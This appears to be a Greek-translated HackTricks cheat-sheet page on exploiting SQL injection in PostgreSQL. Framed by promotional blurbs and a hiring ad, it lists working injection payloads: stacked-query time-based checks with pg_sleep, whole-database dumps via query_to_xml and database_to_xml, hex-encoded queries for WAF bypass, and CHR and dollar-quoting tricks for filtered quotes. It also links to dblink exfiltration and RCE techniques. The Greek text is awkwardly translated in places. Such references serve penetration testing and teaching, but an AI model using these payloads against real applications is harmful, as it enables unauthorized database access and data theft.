# PostgreSQL injection

<details>

<summary><strong>Μάθετε το χάκινγκ στο AWS από το μηδέν μέχρι τον ήρωα με το</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (Ειδικός Ερυθρού Συνεργείου AWS του HackTricks)</strong></a><strong>!</strong></summary>

Άλλοι τρόποι υποστήριξης του HackTricks:

* Αν θέλετε να δείτε την **εταιρεία σας διαφημισμένη στο HackTricks** ή να **κατεβάσετε το HackTricks σε μορφή PDF** ελέγξτε τα [**ΣΧΕΔΙΑ ΣΥΝΔΡΟΜΗΣ**](https://github.com/sponsors/carlospolop)!
* Αποκτήστε το [**επίσημο PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Ανακαλύψτε [**την Οικογένεια PEASS**](https://opensea.io/collection/the-peass-family), τη συλλογή μας από αποκλειστικά [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Εγγραφείτε** στην 💬 [**ομάδα Discord**](https://discord.gg/hRep4RUj7f) ή στην [**ομάδα τηλεγραφήματος**](https://t.me/peass) ή **ακολουθήστε** μας στο **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Μοιραστείτε τα χάκινγκ κόλπα σας υποβάλλοντας PRs** στα [**HackTricks**](https://github.com/carlospolop/hacktricks) και [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) αποθετήρια του github.

</details>

<figure><img src="../../../.gitbook/assets/image (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

Αν σας ενδιαφέρει η **καριέρα στο χάκινγκ** και να χακεύετε το αχακέυτο - **σας προσλαμβάνουμε!** (_απαιτείται άριστη γραπτή και προφορική γνώση της πολωνικής_).

{% embed url="https://www.stmcyber.com/careers" %}

***

**Αυτή η σελίδα στοχεύει να εξηγήσει διαφορετικά κόλπα που θα μπορούσαν να σας βοηθήσουν να εκμεταλλευτείτε μια εισαγωγή SQL που βρέθηκε σε μια βάση δεδομένων postgresql και να συμπληρώσετε τα κόλπα που μπορείτε να βρείτε στο** [**https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/SQL%20Injection/PostgreSQL%20Injection.md**](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/SQL%20Injection/PostgreSQL%20Injection.md)

## Δικτυακή Αλληλεπίδραση - Ανόρθωση Προνομίων, Σαρωτής Θυρών, Αποκάλυψη Απόκρισης Πρόκλησης NTLM & Εξυπρέπεια

Το **module PostgreSQL `dblink`** προσφέρει δυνατότητες για σύνδεση με άλλα περιστατικά PostgreSQL και εκτέλεση συνδέσεων TCP. Αυτές οι λειτουργίες, σε συνδυασμό με τη λειτουργικότητα `COPY FROM`, επιτρέπουν ενέργειες όπως ανόρθωση προνομίων, σάρωση θυρών και καταγραφή απόκρισης πρόκλησης NTLM. Για λεπτομερείς μεθόδους εκτέλεσης αυτών των επιθέσεων ελέγξτε πώς να [εκτελέσετε αυτές τις επιθέσεις](network-privesc-port-scanner-and-ntlm-chanllenge-response-disclosure.md).

### **Παράδειγμα Εξυπρέπειας χρησιμοποιώντας dblink και μεγάλα αντικείμενα**

Μπορείτε να [**διαβάσετε αυτό το παράδειγμα**](dblink-lo\_import-data-exfiltration.md) για να δείτε ένα παράδειγμα CTF **πώς να φορτώσετε δεδομένα μέσα σε μεγάλα αντικείμενα και στη συνέχεια να εξυπρετείτε το περιεχόμενο των μεγάλων αντικειμένων μέσα στο όνομα χρήστη** της λειτουργίας `dblink_connect`.

## Επιθέσεις PostgreSQL: Ανάγνωση/εγγραφή, RCE, ανόρθωση προνομίων

Ελέγξτε πώς να διακινδυνεύσετε τον κεντρικό υπολογιστή και να αναβαθμίσετε προνόμια από το PostgreSQL σε:

{% content-ref url="../../../network-services-pentesting/pentesting-postgresql.md" %}
[pentesting-postgresql.md](../../../network-services-pentesting/pentesting-postgresql.md)
{% endcontent-ref %}

## Παράκαμψη WAF

### Συναρτήσεις Συμβολοσειράς PostgreSQL

Η διαχείριση συμβολοσειρών μπορεί να σας βοηθήσει να **παρακάμψετε WAFs ή άλλους περιορισμούς**.\
[**Σε αυτήν τη σελίδα** ](https://www.postgresqltutorial.com/postgresql-string-functions/)**μπορείτε να βρείτε μερικές χρήσιμες συναρτήσεις συμβολοσειράς.**

### Στοίβα Ερωτημάτων

Θυμηθείτε ότι το postgresql υποστηρίζει στοίβα ερωτημάτων, αλλά πολλές εφαρμογές θα εμφανίσουν σφάλμα αν επιστραφούν 2 απαντήσεις όταν αναμένουν μόνο 1. Ωστόσο, μπορείτε ακόμα να καταχρηστείτε τις στοιβαγμένες ερωτήσεις μέσω ενέσεων Χρόνου:

```
id=1; select pg_sleep(10);-- -
1; SELECT case when (SELECT current_setting('is_superuser'))='on' then pg_sleep(10) end;-- -
```

### Κόλπα XML

**query\_to\_xml**

Αυτή η συνάρτηση θα επιστρέψει όλα τα δεδομένα σε μορφή XML σε ένα μόνο αρχείο. Είναι ιδανική εάν θέλετε να αδειάσετε μεγάλο όγκο δεδομένων σε μόνο 1 σειρά:

```sql
SELECT query_to_xml('select * from pg_user',true,true,'');
```

**database\_to\_xml**

Αυτή η συνάρτηση θα αδειάσει ολόκληρη τη βάση δεδομένων σε μορφή XML σε μόλις 1 σειρά (να είστε προσεκτικοί αν η βάση δεδομένων είναι πολύ μεγάλη καθώς μπορεί να προκαλέσετε DoS ή ακόμα και στον ίδιο σας τον client):

```sql
SELECT database_to_xml(true,true,'');
```

### Συμβολοσειρές σε Hex

Εάν μπορείτε να εκτελέσετε **ερωτήματα** περνώντας τα **μέσα από μια συμβολοσειρά** (για παράδειγμα χρησιμοποιώντας τη λειτουργία **`query_to_xml`**). **Μπορείτε να χρησιμοποιήσετε το convert\_from για να περάσετε τη συμβολοσειρά ως hex και να παρακάμψετε τα φίλτρα με αυτόν τον τρόπο:**

```sql
select encode('select cast(string_agg(table_name, '','') as int) from information_schema.tables', 'hex'), convert_from('\x73656c656374206361737428737472696e675f616767287461626c655f6e616d652c20272c272920617320696e74292066726f6d20696e666f726d6174696f6e5f736368656d612e7461626c6573', 'UTF8');

# Bypass via stacked queries + error based + query_to_xml with hex
;select query_to_xml(convert_from('\x73656c656374206361737428737472696e675f616767287461626c655f6e616d652c20272c272920617320696e74292066726f6d20696e666f726d6174696f6e5f736368656d612e7461626c6573','UTF8'),true,true,'')-- -h

# Bypass via boolean + error based + query_to_xml with hex
1 or '1' = (query_to_xml(convert_from('\x73656c656374206361737428737472696e675f616767287461626c655f6e616d652c20272c272920617320696e74292066726f6d20696e666f726d6174696f6e5f736368656d612e7461626c6573','UTF8'),true,true,''))::text-- -
```

### Απαγορευμένα εισαγωγικά

Αν δεν μπορείτε να χρησιμοποιήσετε εισαγωγικά για το payload σας, μπορείτε να το παρακάμψετε χρησιμοποιώντας το `CHR` για βασικές δηλώσεις (_η συνένωση χαρακτήρων λειτουργεί μόνο για βασικές ερωτήσεις όπως SELECT, INSERT, DELETE, κλπ. Δεν λειτουργεί για όλες τις δηλώσεις SQL_):

```
SELECT CHR(65) || CHR(87) || CHR(65) || CHR(69);
```

Ή με `$`. Αυτές οι ερωτήσεις επιστρέφουν τα ίδια αποτελέσματα:

```
SELECT 'hacktricks';
SELECT $$hacktricks$$;
SELECT $TAG$hacktricks$TAG$;
```

<figure><img src="https://github.com/carlospolop/hacktricks/blob/gr/.gitbook/assets/image%20(1)%20(1)%20(1)%20(1)%20(1)%20(1)%20(1)%20(1)%20(1)%20(1)%20(1)%20(1)%20(1)%20(1)%20(1)%20(1)%20(1)%20(1)%20(1)%20(1)%20(1)%20(1).png" alt=""><figcaption></figcaption></figure>

Εάν ενδιαφέρεστε για **καριέρα στο χάκινγκ** και για να χακεύετε το αχακούμπαλο - **προσλαμβάνουμε!** (_απαιτείται άριστη γνώση γραπτού και προφορικού Πολωνικών_).

{% embed url="https://www.stmcyber.com/careers" %}

<details>

<summary><strong>Μάθετε χάκινγκ στο AWS από το μηδέν μέχρι τον ήρωα με το</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Άλλοι τρόποι υποστήριξης του HackTricks:

* Εάν θέλετε να δείτε την **εταιρεία σας διαφημισμένη στο HackTricks** ή να **κατεβάσετε το HackTricks σε μορφή PDF** ελέγξτε τα [**ΣΧΕΔΙΑ ΣΥΝΔΡΟΜΗΣ**](https://github.com/sponsors/carlospolop)!
* Αποκτήστε το [**επίσημο PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Ανακαλύψτε [**την Οικογένεια PEASS**](https://opensea.io/collection/the-peass-family), τη συλλογή μας από αποκλειστικά [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Εγγραφείτε στη** 💬 [**ομάδα Discord**](https://discord.gg/hRep4RUj7f) ή στη [**ομάδα telegram**](https://t.me/peass) ή **ακολουθήστε** μας στο **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Μοιραστείτε τα χάκινγκ κόλπα σας υποβάλλοντας PRs στα** [**HackTricks**](https://github.com/carlospolop/hacktricks) και [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) αποθετήρια στο github.

</details>
